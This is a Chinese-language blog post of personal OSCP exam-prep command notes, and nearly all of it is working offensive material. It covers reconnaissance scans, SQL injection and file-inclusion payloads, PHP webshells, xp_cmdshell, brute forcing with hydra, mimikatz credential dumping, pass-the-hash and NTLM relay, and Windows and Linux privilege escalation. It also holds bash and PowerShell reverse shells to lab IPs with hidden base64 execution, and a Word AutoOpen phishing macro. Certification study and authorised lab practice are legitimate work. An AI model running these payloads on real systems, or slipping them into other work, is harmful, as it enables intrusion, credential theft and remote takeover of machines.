---
title: "针对OSCP考试的命令笔记"
date: 2023-10-02T22:53:48+08:00
Tags: ["OSCP"]
Caegories: ["渗透测试","OSCP","命令"]
draft: false



---

# 此命令笔记只针对OSCP考试，不包括内容、攻击方式。随时更新

## 信息收集

### nmap

```bash
### 3389开 看机器上除了 Administrator 还有哪些用户
	rdesktop -u '' -a 16


### 只探活  少量主机不用--min参数
	nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml 121.23.6.0/24

### 只端口 大量目标提速
	nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt
	或
	nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v <IP> -p-


### 参数
--top-ports=20
###筛选脚本
grep 'exploits' /usr/share/nmap/scripts/*.nse
### 脚本详细信息
nmap --script-help=clamav-exec.nse

### tcp
	nmap -sS -sC -Pn -v -p 1-1000 192.168.50.0/24 192.168.45.0/24

### udp
	nmap -sU -v -Pn -p 100-200 192.168.212.151


## windows 
### 扫描端口
	ps> 
	1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.229.151", $_)) "TCP port $_ is open"} 2>$null

```
## 扫目录
```bash
dirsearch -u xxxx
gobuster dir -u http://192.168.231.16:5002/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -p pattern -t 64
```

### SMB
```bash
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152

## 枚举信息
	enum4linux -a ip
	
	smbclient


```
### SMTP
```bash
### 25 smtp discovery
	nmap -v -p 25 --script smb-os-discovery.nse -iL smtpip | grep open 

### 用户是否存在探测
	nc -nv 192.168.221.8 25


### 自动探测用户是否存在python3 smtp.py root 192.168.50.8

#!/usr/bin/python

import socket
import sys
if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))
# Receive the banner
banner = s.recv(1024)
print(banner)
# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)
# Close the socket
s.close()
```
### SNMP
```bash
## SNMP服务
	sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt


## 列出当前tcp监听端口
	snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3

## 当前进程
	snmpwalk -c
	public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2

## 用户
	snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25

# #安装的软件
	snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2

```


## 漏洞扫描
### nessus
```
没做
```
### nmap
```bash
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124

nmap -sV --script "exploit" 192.168.242.10
nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.227
```

## 常见漏洞
```bash
xss
	提权管理员
目录遍历
	读用户
	读id_rsa
		/home/offsec/.ssh/id_rsa
		ssh -i ss_isa -p 2222 offsec@mountaindesserts.com
文件包含
	apache日志 useragent   <?php echo system($_GET['cmd']); ?>  
	访问时记得使用& 而不是？
	%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/
	%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\
	../../../../../../../../../../../../../../../../../../
	..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
	
	##直接读取文件
	php://filter/convert.base64-encode/resource=xxx
	##将数据嵌入到web中执行   必须allow_url_include
	data://
	data://text/plain,<?php%20echo%20system('dir')?> 
	data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls 
	
文件上传
	传马
		<?php system($_REQUEST['cmd']); ?>
		<?php echo system($_GET['cmd']); ?>
	传公钥覆盖
		ssh-keygen
		cat fileup.pub 
		../../../../../../../../../root/.ssh/authorized_keys
		rm ~/.ssh/known_hosts
		ssh -p 2222 -i fileup root@mountaindesserts.com

	php7
	phps 
	phtml
	大小写
	
命令注入
	##截断 
	;  %3b
	& &&
	###判断当前环境
	(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell


SQL注入
	

```

### SQL注入 
mysql
```sql
### mysql
练接
mysql -u root -p'root' -h 192.168.199.197   -P 3306

### 联合查询
	1' union select 1,2,3-- -
	查数据库
  database()
  1' union select schema_name,1 from information_schema.schemata
  查表
  1' union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #
  查列
  1' union select group_concat(column_name),database() from information_schema.columns where table_schema = database() #
  
### 报错注入
	floor
		-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)--+
	extractvalue
		-1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
	updatexml
		-1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
		
###布尔盲注
	1' and length(database()>=8)-- 
	1' and left(database(),1)='a'-- 
	1' and substr(database(),2,1)='a'-- 
	
### 时间注入
	1’ and if(length(database())=4,sleep(5),1)


### shell
写文件
	'+UNION+SELECT+null,"<%3fphp+system($_GET['cmd'])%3b%3f>",+null,+null+INTO+OUTFILE+"/var/www/html/tmp/a.php"+--+//
	
```
mssql
```sql
### mssql
连接
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
## 所有库
SELECT name FROM sys.databases;
## offsec库里的所有表
SELECT * FROM offsec.information_schema.tables;
## offsec库的users表内容
select * from offsec.dbo.users;



## shell  xp-cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';


```

## 溢出
```
## 程序
以后做

### web组件
searchsploit搜索
```

## av bypass
```
remote
powershell
	chimera
tide免杀平台

```
## 密码相关

```bash
### ssh
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.218.201 
### rdp 
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

### get 401
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-get /
### post
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


hash
### 识别
	hashid
	hash-identify
## hashcat
	### 调试
	hashcat -r upper.rule --stdout testword.txt
	### md5破解
	hashcat -m 0 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force

## 密码管理器
	### 找文件 keepass
	Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	### 格式化
	keepass2john Database.kdbx > keepass.hash
	### 看下hash有没有问题
	### 找m
	hashcat -h | grep -i 'htlm'
	### 破解
	hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force


## ssh 私钥
	chmod 600 id_rsa
	### 格式化hash
	ssh2john id_rsa > ssh.hash
	### 规则
	/etc/john/john.conf
	第一行加上  [List.Rules:sshRules]
	### crack
	john --wordlist=ssh.passwords --rules=sshRules ssh.hash


## NTLM hash 
### ntlm破解 mimikatz直接解明文 已经有了管理员shell
	privilege::debug	###开启SeDebugPrivilege访问权限
	token::elevate 		###提升至system权限
	lsadump::sam
	hashcat -m 1000 2835573fb334e3696ef62a00e5cf7571 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
### ntlm传递 已经有了shell，执行命令需要此账户在目标机有管理员权限，无视UAC
smb 
	mimikatz
	impacket-psexec -hashes 00000000000000000000000000000000:管理员hash Administrator@20.63.142.48 cmd.exe


### netntlm2破解 跳板机可以执行命令，账户在目标机没有管理员权限
	responder -I tun0
	目标：dir \\kaliip\\test
	hashcat -m 5600 ./pual.hash /usr/share/wordlists/rockyou.txt --force 
### nethtlm2中继  跳板机可以执行命令，目标机需要目标禁用UAC
	impacket-ntlmrelayx --no-http-server -smb2support -t 目标机 -c "powershell -nop -w hidden -e reverseShell"
	跳板机：dir \\kali\test
	kali 1234


```
hashcat
```bash
### 调试
hashcat -r upper.rule --stdout testword.txt

### md5破解
hashcat -m 0 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force
```

## win提权
### win信息收集

自动化工具
```bash
### winPEASx64.exe
	/usr/share/privilege/win/winPEASany.exe
	ps> iwr -uri http://10.10.10.9:1111/winPEASany.exe -Outfile winpeas.exe
### Seatbelt
	/usr/share/privilege/win/Seatbelt.exe
	./Seatbelt.exe -group=all
### JAWS

```


本机信息收集  ../powershell.md
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

powershell帐号 程序 进程 敏感文件 相关
```powershell

##信息收集
	Get-NetRoute
    Get-LocalUser   
    Get-localGroup
    Get-localgroupmember Administrators
    net user xxx 某人所属组
		帐号无法rdp就用ps> runas
		### 如果可以访问GUI，有帐号密码，可以用runas以另外用户身份执行命令
		runas /user:admin cmd
	### 历史命令
	(Get-PSReadlineOption).HistorySavePath
	Get-History
	### 服务
	Get-Service Cmdlet或Get-CimInstance Cmdlet
	### 个人权限
	whoami /priv

	### 4104 powershell执行记录
	eventvwr.msc > application and service > Microsoft > Windows > powershell


###已安装的32b程序不全，检查2个目录：download、C://32位和64位Program Files
    get-itemproperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
###已安装的64b程序
    get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
### 其他位置程序
	get-itemproperty "HKLM:\SOFTWARE\Microsoft\*" | select displayname
	download 
	C://32位和64位Program Files
###正在运行的进程
	get-process 
	查看某个运行程序（或进程）的命令行参数
	cmd> wmic process get caption,commandline /value
	某一个进程的命令行参数，使用下列方式：
	cmd> wmic process where caption="xxx.exe" get caption,commandline /value

###搜索系统上的所有密码管理器数据库
    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
###搜索指定后缀名的文件 敏感信息
    Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
    Get-ChildItem -Path C:\Users\public\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
### 常用位置 ### 公共位置 ###
    C:\softName
    C:\Users\userName
    C:\Users\public
    *.txt
    *.ini

###查看正在运行的服务的信息
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
###查看正在运行的服务的启动类型
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'everything'}

### 下载
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

WinRM
```bash
## 加入Windows Management Users组的话，可以使用winrm进行powershell远程管理
注意转意
evil-winrm  -i 10.10.10.4 -u user -p "user111\,\.\/"

```

### win服务
```powershell 
---------
## exe劫持
	### 自动
		/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
		powershell -ep bypass 
		. .\PowerUp.ps1
		Get-ModifiableServiceFile
		### 内置函数-替换服务：重启服务并添加账户john/Password123! 
		Install-ServiceBinary -Name 'mysql'
		
	### 手动
		###查看正在运行的服务的信息
		Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
		###查看正在运行的服务的启动类型
		Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'everything'}
		
		### 列举服务 
		services.msc，Get-Service Cmdlet或Get-CimInstance Cmdlet
		### 列运行中的服务
		Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
		### 看w权限
		icacls "C:\xampp\apache\bin\httpd.exe"
		### c添加用户  /usr/share/privilege/win/adduser.c
		x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
		### 覆盖原文件 文件正在使用中》powershell下用move
		### 服务重启 启动
		net stop mysql
		Restart-Service BetaService
		### 服务的启动模式
		Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
		### 自动启动并且有重启权限的话可以重启机器
		whoami /priv
		shutdown /r /t 0
		
		
----------
## dll劫持
### 正常加载顺序。当禁用安全dll时当前目录会在第二步被搜索，dll缺失是个不错的位置
	1. 程序目录
	2. 系统目录
	3. 16位系统目录
	4. windows目录
	5. 当前目录
	6. $PATH目录
自动 /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
### 列运行中的服务
	Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
### 看w权限
	icacls "C:\xampp\apache\bin\httpd.exe"
### 找不到替换的exe 找notfound的dll替换。procmod做筛选process name，筛选的是service的exe，
	tool：/usr/share/privilege/win/Procmondll/ 64
### 恶意dll
	/usr/share/privilege/win/
	x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
### 重启服务
	Restart-Service 
	

----------
## 未引用路径 空格缺陷。主目录或子目录具有写权限，但无法替换其中的文件时
### 自动
	PowerUp.ps1
	powershell -ep bypass
	Get-UnquotedService
	### exe是恶意exe
	Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" 
### 手动
	Get-CimInstance -ClassName win32_service | Select Name,State,PathName
	cmd> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
	检查下能不能启动停止服务
	ps> icacls看下路径的w权限

```

### win计划任务 
```powershell
## 计划任务 寻找有权限的 然后文件替换
	## 计划任务列表
	schtasks /query /fo LIST /v
	## 看文件权限
	icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
	## 替换
```

### 其他 
```powershell
--------
## 应用程序漏洞

--------
## 内核洞 

--------
## Windows特权 一般很少，iis中多
	可能特权：SeBackupPrivilege、SeAssignPrimaryToken、SeLoadDriver和SeDebug
	看是否有以上权限 whoami /priv
	### tools
		PrintSpoofer
			/usr/share/privilege/win/PrintSpoofer64.exe
			.\PrintSpoofer64.exe -i -c powershell.exe 
		potato家族：https://portal.offsec.com/courses/pen-200/books-and-videos/modules
			RottenPotato
			SweetPotato
			JuicyPotato
```

## linux提权
### linux信息收集
```bash
------
## 自动
	### unix-privesc-check
		kali> /usr/bin/unix-privesc-check |/usr/share/privilege/linux/
		use: ./unix-privesc-check standard > output.txt
	LinEnum
	LinPeas
------
## 手动
	## 用户
		id 
			uid1000是第一个
		cat /etc/passwd
			### 利用：条件passwd文件能写
			密码大概率用crypt加密，也可能des或md5
				openssl passwd root
				echo "root2:jHAWKFhGozqCg:0:0:root:/root:/bin/bash" >> /etc/passwd
				
	
	hostname 
	## 版本信息
		uname -a 
	    cat /etc/issue
	    cat /etc/os-release
	    arch
    ## 进程
	    ps aux 
		    -C 进程名
		watch -n 1 "ps -aux | grep pass"
	## 流量 管理员权限
		sudo tcpdump -i lo -A | grep "pass"
	## 路由 
	    ip a
	    routel
	## 网络
	    ss -anp
	    netstat -anp
	## 防火墙
	    cat /etc/iptables/....
	## 计划任务
		ls -lah /etc/cron*
	    sudo crontab -l 
	    cat /var/log/cron.log
	    grep "CRON" /var/log/syslog
	    找能w的文件，反弹shell
	## 敏感文件
		env 
	    .bashrc
	## 带s权限的文件 suid
		find / -perm -u=s -type f 2>/dev/null
		###这种权限的文件会以文件创建者的权限执行，有继承的文件的话其为esid euid
		利用: 往下翻，见不安全的组件find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
	## 有写权限的目录
		find / -writable -type d 2>/dev/null
    ## 安装的程序
		dpkg -l
	## 挂载的目录
		mount
		cat /etc/fstab
		lsblk ##所有可用磁盘
	## 加载的内核
		lsmod
		/sbin/modinfo 内核名  ##内核信息
	
	
	
```
### 泄漏的机密信息
```bash
## 敏感文件
	env 
	.bashrc
###当前用户允许执行的命令
    sudo -l 
###管理员账户可以使用-i切换至root
    sudo -i
### 我们将最小和最大长度设置为6个字符，使用-t参数指定模式，然后将前三个字符硬编码为Lab，后跟三个数字
	crunch  6 7 -t Lab%%% > asd.txt
	hydra

## 进程
	watch -n 1 "ps -aux | grep pass"
## 流量
	sudo tcpdump -i lo -A | grep "pass"
```
### linux不安全的组件
```bash
---------
## suid滥用



---------
## 



--------
##

```
### 其他






## 反弹shell 
```powershell
------------
### linux
bash -c "bash -i >& /dev/tcp/192.168.45.176/1234 0>&1"

### cli内容>>
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|bash -c 'bash -i >& /dev/tcp/192.168.45.176/1234 0>&1' >/tmp/f" >> /tmp/this_is_fine.sh




------------
### win
'$client = New-Object System.Net.Sockets.TCPClient("192.168.45.212",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

### win编码脚本  在线运行：https://www.w3cschool.cn/tryrun/runcode?lang=powershell

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.221",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText


use > powershell -enc "xxxx"
use > 
powershell.exe -nop -w hidden -enc "xxx"

## winbase64编码
```bash
$Text = ''
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

huozhe
~/桌面/OSCP/smallTools/reverseShell_powershell.py
```


##  钓鱼
doc宏
```powershell
###
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
###

###参数 分割
str = "powershell.exe -nop -w hidden -e xxx"
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')


```



